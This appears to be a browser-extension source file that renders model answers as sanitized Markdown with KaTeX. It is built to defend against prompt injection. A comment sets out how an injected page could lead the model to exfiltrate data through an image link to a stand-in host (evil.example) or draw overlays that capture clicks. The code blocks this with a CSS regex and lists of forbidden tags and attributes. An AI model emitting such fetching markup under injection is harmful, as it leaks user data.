/**
 * Markdown → sanitized HTML with KaTeX (and mhchem) for $...$ / $$...$$.
 * Math is rendered before Markdown so underscores inside formulas survive,
 * then everything passes through DOMPurify.
 */
import DOMPurify from 'dompurify';
import katex from 'katex';
import 'katex/contrib/mhchem';
import { marked } from 'marked';

marked.setOptions({ gfm: true, breaks: false });

/**
 * Answers now come from a real model, and a page can try to steer a model
 * (prompt injection). Three consequences for what we render:
 * - Links open in a new tab. Followed in place, a link would navigate the
 *   side panel itself away from the extension.
 * - Nothing is fetched. `![](https://evil.example/?q=…)`, a CSS
 *   `url(…)`, a `background` attribute or an SVG/MathML image would make the
 *   panel fetch a URL of the model's choosing with no click, carrying
 *   whatever it was talked into putting there. Answers are text and KaTeX;
 *   nothing needs a remote resource. (The pages' CSP refuses remote images
 *   too: wxt.config.ts.)
 * - An answer stays in its box: no fixed or absolute layers drawn over the
 *   rest of the panel, where a click would land on the model's link.
 */
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});
/** A style that fetches something or leaves the answer's box. KaTeX's own styles never do either. */
const UNSAFE_STYLE = /url\s*\(|image-set|image\s*\(|expression\s*\(|@import|behavior\s*:|binding\s*:|position\s*:\s*(fixed|absolute|sticky)/i;
DOMPurify.addHook('uponSanitizeAttribute', (_node, data) => {
  if (data.attrName === 'style' && UNSAFE_STYLE.test(data.attrValue)) data.keepAttr = false;
});
const FORBID_TAGS = ['img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'feimage', 'mglyph', 'link', 'style', 'form', 'input', 'button'];
/** Attributes that fetch (background, ping) on tags otherwise allowed. */
const FORBID_ATTR = ['background', 'ping', 'poster', 'srcset', 'action', 'formaction'];

const PLACEHOLDER = (i: number) => `\u0000MATH${i}\u0000`;

export function renderMath(tex: string, display: boolean): string {
  try {
    // maxSize: a formula can't stretch an answer (\\rule, \\kern) to any size.
    return katex.renderToString(tex, { displayMode: display, throwOnError: false, output: 'htmlAndMathml', strict: 'ignore', maxSize: 50 });
  } catch {
    return `<code>${escapeHtml(tex)}</code>`;
  }
}

/** Replaces math with placeholders, renders Markdown, then restores KaTeX HTML; sanitized. */
export function renderMarkdown(src: string): string {
  return DOMPurify.sanitize(markdownHtml(src), SANITIZE);
}

/**
 * The same, as DOM nodes ready to append: the panel never assigns HTML to an
 * element (innerHTML), it inserts what DOMPurify has already parsed and cleaned.
 */
export function renderMarkdownFragment(src: string): DocumentFragment {
  return DOMPurify.sanitize(markdownHtml(src), { ...SANITIZE, RETURN_DOM_FRAGMENT: true });
}

const SANITIZE = { USE_PROFILES: { html: true, mathMl: true, svg: true }, FORBID_TAGS, FORBID_ATTR };

function markdownHtml(src: string): string {
  const math: string[] = [];
  let text = src;
  // Display math first: $$...$$ and \[...\]
  text = text.replace(/\$\$([\s\S]+?)\$\$|\\\[([\s\S]+?)\\\]/g, (_m, a: string | undefined, b: string | undefined) => {
    math.push(renderMath((a ?? b ?? '').trim(), true));
    return PLACEHOLDER(math.length - 1);
  });
  // Inline math: $...$ (not $$) and \(...\)
  text = text.replace(/(?<!\$)\$(?!\$)((?:\\\$|[^$\n])+?)\$(?!\$)|\\\(([\s\S]+?)\\\)/g, (_m, a: string | undefined, b: string | undefined) => {
    math.push(renderMath((a ?? b ?? '').trim(), false));
    return PLACEHOLDER(math.length - 1);
  });
  let html = marked.parse(text, { async: false }) as string;
  return html.replace(/\u0000MATH(\d+)\u0000/g, (_m, i: string) => math[Number(i)] ?? '');
}

export function escapeHtml(s: string): string {
  return s.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]!);
}
